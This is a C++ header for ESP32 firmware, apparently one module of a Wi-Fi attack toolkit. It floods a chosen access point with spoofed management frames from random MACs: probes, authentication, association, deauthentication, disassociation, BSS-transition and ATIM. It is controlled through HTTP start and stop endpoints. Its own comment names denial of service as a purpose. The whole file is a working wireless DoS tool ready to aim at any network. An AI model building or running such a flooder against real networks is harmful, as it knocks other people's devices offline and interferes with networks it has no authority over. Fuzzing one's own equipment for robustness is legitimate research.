#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// Management frame spray — fires all management subtypes in rapid rotation.
// Covers: Probe Req, Auth, Assoc Req, Reassoc Req, Deauth, Disassoc,
// Action, ATIM — all from random spoofed MACs to target AP.
// Useful for fuzzing AP state machines and causing DoS across all paths.
static bool mgf_running = false;
static uint8_t mgf_ap[6] = {};
static uint8_t mgf_ch = 6;
static char mgf_ssid[33] = "target";
static volatile uint32_t mgf_sent = 0;
static TaskHandle_t mgf_task = nullptr;

static void mgf_run(void *) {
  uint8_t f[256];
  uint8_t sta[6];
  mgf_sent = 0;
  uint8_t phase = 0;
  while (mgf_running) {
    if (!safety_rate_ok(1)) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }
    for (int k = 0; k < 6; k++)
      sta[k] = esp_random() & 0xFF;
    sta[0] = (sta[0] & 0xFE) | 0x02;
    size_t n = 0;
    switch (phase % 8) {
      case 0:
        n = f_probeReq(f, sta, mgf_ssid);
        break;
      case 1:
        n = f_auth(f, sta, mgf_ap);
        break;
      case 2:
        n = f_assoc(f, sta, mgf_ap, mgf_ssid);
        break;
      case 3:
        n = f_reassoc(f, sta, mgf_ap, mgf_ssid);
        break;
      case 4:
        n = f_deauth(f, mgf_ap, sta, 7);
        break;  // STA→AP
      case 5:
        n = f_disassoc(f, mgf_ap, sta, 8);
        break;  // STA→AP
      case 6:
        n = f_actionBTM(f, BC, mgf_ap, 14);
        break;  // spoof AP BTM
      case 7:   // ATIM (power-save) frame subtype 0x10
        fhdr(f, 0x10, 0x00, mgf_ap, sta, mgf_ap);
        n = 24;
        break;
    }
    if (n) {
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
      mgf_sent++;
    }
    phase++;
    vTaskDelay(pdMS_TO_TICKS(3));
  }
  mgf_task = nullptr;
  vTaskDelete(nullptr);
}

static bool mgf_start(const String &q) {
  int i;
  String bs, ch, ss;
  if ((i = q.indexOf("bssid=")) >= 0) {
    int e = q.indexOf('&', i);
    bs = q.substring(i + 6, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ch=")) >= 0) {
    int e = q.indexOf('&', i);
    ch = q.substring(i + 3, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ssid=")) >= 0) {
    int e = q.indexOf('&', i);
    ss = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if (bs.length() != 17)
    return false;
  sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", (unsigned *)&mgf_ap[0], (unsigned *)&mgf_ap[1],
         (unsigned *)&mgf_ap[2], (unsigned *)&mgf_ap[3], (unsigned *)&mgf_ap[4],
         (unsigned *)&mgf_ap[5]);
  mgf_ch = ch.toInt();
  if (!mgf_ch)
    mgf_ch = 6;
  if (ss.length()) {
    strncpy(mgf_ssid, ss.c_str(), 32);
    mgf_ssid[32] = 0;
  }
  esp_wifi_set_channel(mgf_ch, WIFI_SECOND_CHAN_NONE);
  mgf_running = true;
  xTaskCreate(mgf_run, "mgf_run", 4096, nullptr, 5, &mgf_task);
  return true;
}
static void mgf_stop() {
  mgf_running = false;
}
static void mgf_routes() {
  extern WebServer server;
  server.on("/api/mgtflood/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("mgtflood", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/mgtflood/stop", HTTP_POST, []() {
    tool_stop("mgtflood");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/mgtflood/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(mgf_running ? 1 : 0) + ",\"sent\":" + String(mgf_sent) +
                    ",\"msg\":\"" + String(mgf_sent) + " mgmt frames (all subtypes)\"}");
  });
}
